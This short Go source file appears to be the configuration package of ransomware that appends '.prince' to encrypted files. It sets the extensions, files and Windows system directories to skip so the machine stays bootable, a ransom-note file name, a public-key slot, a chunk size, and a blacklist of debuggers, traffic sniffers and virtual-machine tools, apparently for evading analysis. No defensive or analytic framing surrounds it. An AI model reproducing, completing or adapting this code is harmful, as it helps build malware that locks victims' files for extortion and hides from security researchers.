package configuration

var ExcludedExtensions = []string{".sys", ".exe", ".dll", ".com", ".scr", ".bat", ".vbs", ".ps1", ".lnk", ".inf", ".reg", ".msi", ".ini", EncryptedExtension}
var ExcludedFiles = []string{"boot.ini", "bootmgr", "bcd", "desktop.ini", "config.sys", "autoexec.bat", "decryption instructions.txt"}
var ExcludedDirectories = []string{"windows", "system32", "programdata", "program files", "program files (x86)", "public", "system volume information", "\\system volume information", "efi", "boot", "public", "perflogs", "microsoft", "intel", "appdata", ".dotnet", ".gradle", ".nuget", ".vscode", "msys64"}
var BlacklistedProcesses = []string{"ksdumperclient", "regedit", "ida64", "vmtoolsd", "vgauthservice", "wireshark", "x32dbg", "ollydbg", "vboxtray", "df5serv", "vmsrvc", "vmusrvc", "taskmgr", "vmwaretray", "xenservice", "pestudio", "vmwareservice", "qemu-ga", "prl_cc", "prl_tools", "cmd", "joeboxcontrol", "vmacthlp", "httpdebuggerui", "processhacker", "joeboxserver", "fakenet", "ksdumper", "vmwareuser", "fiddler", "x96dbg", "dumpcap", "vboxservice"}
var EncryptedExtension string = ".prince"
var PublicKey string
var RansomNote string = "Ransom Message"
var ChunkSize int = 1 * 1024 * 1024
